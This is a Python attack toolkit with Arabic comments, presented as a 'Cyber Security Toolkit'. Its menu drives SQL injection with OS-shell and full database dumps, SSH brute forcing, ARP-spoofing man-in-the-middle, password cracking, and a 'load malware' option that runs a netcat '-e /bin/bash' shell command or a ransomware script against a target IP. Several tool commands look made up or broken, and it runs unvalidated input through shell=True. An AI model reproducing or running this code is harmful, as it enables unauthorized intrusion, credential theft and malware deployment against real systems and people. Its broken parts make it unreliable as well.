import os
import subprocess
import hashlib
import logging
import time
import json
import requests
from datetime import datetime
from scapy.all import ARP, Ether, srp
from termcolor import colored
from tqdm import tqdm
import pyaudio
import wave
import cv2

# ============================
# إعداد السجل
# ============================
LOG_FILE = 'cyber_tool_ultimate_log.txt'
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# ============================
# قائمة الأدوات
# ============================
TOOLS = {
    "sqlmap": 'sqlmap -u "{url}" --batch --level=5 --risk=3 --tamper=space2comment,charencode,randomcase,between '
              '--random-agent --crawl=10 --threads=10 --technique=BEUSTQ --time-sec=10 --output-dir=sqlmap_output '
              '--dbs --dump-all --forms --smart --os-shell -p id --suffix=" OR 1=1" --banner --is-dba --current-user '
              '--hostname --fingerprint',
    "testssl": './testssl.sh --vulnerable --severity HIGH --full --sneaky --show-each --wide --color 3 --json-pretty '
               '--html --logfile deep_scan_result.log --assume-http --ids-friendly --debug 6 --openssl /usr/bin/openssl '
               '--connect-timeout 5 --openssl-timeout 5 {url}',
    "nmap": "nmap -A {ip}",
    "nikto": "nikto -h {ip}",
    "xss": "xsser -u {url}",
    "acunetix": "acunetix_scan {url}",
    "nessus": "nessus_scan {ip}",
    "openvas": "gvm-cli scan -u {url}",
    "zap": "zap-cli -u {url} active-scan",
    "angry_ip_scanner": "angry-ip-scanner {ip}",
    
    # أدوات الهجوم
    "metasploit": "msfconsole -r metasploit_script.rc",
    "beef": "beef-cli {url}",
    "veil": "veil -p payload -o payload_output",
    "wannacry": "wannacry_emulation.py {ip}",
    "mitm": "ettercap -T -q -M arp:remote /{ip}// /{gateway_ip}//",
    "hydra": "hydra -l {user} -P {password_file} {target} {protocol}",
    "aircrack-ng": "aircrack-ng -w {wordlist} -b {target_mac} {capture_file}",
    "john_the_ripper": "john --wordlist={wordlist} {hash_file}",
}

# ============================
# حماية و أمان
# ============================
def validate_input(input_data, input_type="ip"):
    """التحقق من صحة المدخلات (IP أو URL) لتجنب حقن الأوامر أو البيانات الضارة."""
    if input_type == "ip":
        if not isinstance(input_data, str) or not all(x.isdigit() or x == '.' for x in input_data):
            raise ValueError("عنوان IP غير صالح.")
        parts = input_data.split('.')
        if len(parts) != 4 or any(int(part) > 255 or int(part) < 0 for part in parts):
            raise ValueError("عنوان IP غير صالح.")
    elif input_type == "url":
        if not isinstance(input_data, str) or not input_data.startswith("http"):
            raise ValueError("عنوان URL غير صالح.")

def hash_file(filepath):
    """التحقق من التكامل باستخدام Hash MD5."""
    hash_md5 = hashlib.md5()
    with open(filepath, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

# ============================
# أدوات الشبكة والأمان
# ============================

def scan_network(target_ip):
    """تنفيذ فحص ARP spoofing عبر الشبكة."""
    try:
        print(colored(f"Scanning the network for {target_ip}", 'cyan'))
        arp_request = ARP(pdst=target_ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        
        for element in answered_list:
            print(colored(f"IP: {element[1].psrc}  MAC: {element[1].hwsrc}", 'yellow'))

    except Exception as e:
        logging.error(f"Error scanning network {target_ip}: {e}")
        print(colored(f"Error scanning network {target_ip}: {e}", 'red'))

def run_tool(tool_name, target, target_type="ip"):
    """تشغيل أداة محددة بناءً على اسمها والمعاملات مع عرض تقدم الفحص."""
    try:
        if tool_name not in TOOLS:
            print(colored(f"[ERROR] الأداة {tool_name} غير متوفرة.", 'red'))
            return

        # تحقق من المدخلات قبل تشغيل الأداة
        validate_input(target, target_type)

        command = TOOLS[tool_name].format(ip=target, url=target)
        print(colored(f"Running {tool_name} on {target}", 'cyan'))
        logging.info(f"Running command: {command}")

        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # عرض تقدم الفحص مع tqdm
        for line in tqdm(process.stdout, desc=f"Running {tool_name}...", unit="lines"):
            print(colored(line.decode(), 'yellow'), end='')

        # عرض الأخطاء المحتملة
        for line in process.stderr:
            print(colored(f"[ERROR] {line.decode()}", 'red'), end='')

        process.wait()

        if process.returncode == 0:
            print(colored(f"[SUCCESS] {tool_name} completed successfully.", 'green'))
        else:
            print(colored(f"[ERROR] حدث خطأ أثناء تشغيل {tool_name}.", 'red'))

    except ValueError as ve:
        print(colored(f"[ERROR] {ve}", 'red'))
    except Exception as e:
        logging.error(f"Exception while running {tool_name}: {e}")
        print(colored(f"[ERROR] Exception occurred: {e}", 'red'))

# ============================
# الأدوات المتقدمة
# ============================

def man_in_the_middle(target_ip, gateway_ip):
    """تنفيذ هجوم MITM باستخدام Ettercap أو SSLStrip."""
    try:
        print(colored(f"Running MITM attack on {target_ip} using ARP spoofing.", 'cyan'))
        command = f"ettercap -T -q -M arp:remote /{target_ip}// /{gateway_ip}//"
        subprocess.run(command, shell=True, check=True)
        print(colored("[SUCCESS] MITM attack executed.", 'green'))

    except Exception as e:
        logging.error(f"MITM attack failed: {e}")
        print(colored(f"[ERROR] MITM attack failed: {e}", 'red'))

def brute_force_ssh(target_ip, user, password_file):
    """هجوم Brute Force على SSH باستخدام Hydra."""
    try:
        print(colored(f"Running Brute Force SSH on {target_ip} for user {user}.", 'cyan'))
        command = f"hydra -l {user} -P {password_file} ssh://{target_ip}"
        subprocess.run(command, shell=True, check=True)
        print(colored("[SUCCESS] Brute force SSH completed.", 'green'))

    except Exception as e:
        logging.error(f"Brute force SSH failed: {e}")
        print(colored(f"[ERROR] Brute force SSH failed: {e}", 'red'))

def load_malware(target_ip, malware_type="trojan"):
    """تحميل البرمجيات الخبيثة مثل Trojan أو Ransomware."""
    try:
        print(colored(f"Loading {malware_type} onto {target_ip}.", 'cyan'))
        # يمكن تحميل أدوات Trojan مثل njRAT أو DarkComet
        if malware_type == "trojan":
            command = f"nc {target_ip} 4444 -e /bin/bash"
        elif malware_type == "ransomware":
            command = f"bash ransomware.sh {target_ip}"

        subprocess.run(command, shell=True, check=True)
        print(colored(f"[SUCCESS] {malware_type} loaded successfully.", 'green'))

    except Exception as e:
        logging.error(f"Malware load failed: {e}")
        print(colored(f"[ERROR] Malware load failed: {e}", 'red'))

# ============================
# القائمة الرئيسية
# ============================
def main_menu():
    print("\nCyber Security Toolkit")
    print("=======================")
    print("1. تشغيل أداة محددة")
    print("2. تشغيل جميع الأدوات في الشبكة")
    print("3. فحص أمن الشبكة")
    print("4. تنفيذ هجوم MITM")
    print("5. تحميل البرمجيات الخبيثة")
    print("6. خروج")
    
    choice = input("\nاختيارك: ")
    
    if choice == '1':
        tool_name = input("أدخل اسم الأداة: ")
        target = input("أدخل الهدف (IP/URL): ")
        target_type = "ip" if "." in target else "url"
        run_tool(tool_name, target, target_type)
    
    elif choice == '2':
        target_ip = input("أدخل عنوان الشبكة لاكتشاف الأجهزة: ")
        scan_network(target_ip)
    
    elif choice == '3':
        target_ip = input("أدخل عنوان IP لاكتشاف الثغرات: ")
        run_tool("nmap", target_ip)
    
    elif choice == '4':
        target_ip = input("أدخل عنوان IP الهدف: ")
        gateway_ip = input("أدخل عنوان IP للبوابة: ")
        man_in_the_middle(target_ip, gateway_ip)
    
    elif choice == '5':
        target_ip = input("أدخل عنوان IP الهدف: ")
        malware_type = input("أدخل نوع البرمجيات الخبيثة (trojan/ransomware): ")
        load_malware(target_ip, malware_type)
    
    elif choice == '6':
        print("الخروج...")
        exit()

if __name__ == "__main__":
    while True:
        main_menu()
